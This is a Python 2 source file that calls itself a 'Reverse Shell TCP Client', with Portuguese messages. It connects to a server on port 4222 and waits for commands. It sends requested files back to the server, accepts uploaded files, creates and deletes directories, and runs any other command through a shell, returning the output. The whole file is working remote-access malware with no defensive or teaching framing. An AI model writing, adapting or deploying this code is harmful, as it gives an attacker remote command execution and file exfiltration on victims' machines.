# -*- coding: cp1252 -*-
import socket,subprocess,os,sys, threading

def download(s,path):
    path = str(os.getcwd())+"\\"+path
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()      
    else: 
        s.send('Unable to find out the file')

def banner():
   print('#######################################################################################################\n\n')
   print('RFS Reverse Shell TCP Client')
   print('#######################################################################################################\n\n')



def mandaArq(s,bits):
    arq = "client_file.py"
    f = open(arq,'wb')
    while True:  
        bits = s.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            s.send(' Upload Completo ')
            f.close()
            break
        f.write(bits)

     


def connect():
    ip = "127.0.0.1"
    port = 4222
    try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip,port))
     while True:
        command = ""
        command = str(s.recv(4096))

        if('quit' in command):
            s.close()
            break
        elif 'pwd' in command:
            s.send(os.getcwd())


        elif 'direc' in command:
            s.send(str(os.listdir(os.getcwd())))
        

        elif 'cd' in command:
            dirc = command[3:]
            if os.path.isdir(dirc):
                 os.chdir(dirc)
                 s.send(os.getcwd())
            else:
                s.send('[+]Diretorio inexistente: %s'%dirc)

        elif 'makedir' in command:
            dirc = command[8:]
            if os.path.isdir(dirc):
                 s.send('[+]Diretorio existente => %s'%dirc)
            else:
                os.mkdir(dirc)
                s.send('[+]Diretorio %s feito com sucesso'%dirc)

        elif 'mandaArq' in command:
            try:
                sended = command[9:]
                mandaArq(s,str(sended))
            except:
                print("ERROR CLIENT %s" %sys.exc_info()[0])
       
                

        elif 'removedir' in command:
            dirc = command[10:]

            if os.path.isdir(dirc):
                 os.rmdir(dirc)
                 s.send('[+]Diretorio %s removido com sucesso'%dirc)
            else:
                s.send('[-]Diretorio %s inexistente'%dirc)
      
        
        elif('input' in command):
            print("[server]: "+command[6:])
            s.send('[client] diz: '+str(raw_input('[client]msg: ')))

        elif 'download' in command:
            down = command[len('download')+1:]
            download(s,down)
            s.send('[+]Download %s feito com sucesso '%down)

        else:
          try:
            cmd = subprocess.Popen(command,shell = True, stdin=subprocess.PIPE,
                                   stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            s.send( cmd.stdout.read() )
            s.send( cmd.stderr.read() )
          except:
              s.send("Erro ao enviar o comando: \n %s "%str(sys.exc_info()[0]))

            
            
    except:
            e = sys.exc_info()[0]
            s.send('Erro: '+str(e)+' ')
            print('[Client] Erro ao se conectar \n %s'%e)

def main():
    server_handler =  threading.Thread(target=connect, args=())
    server_handler.start()
    
main()
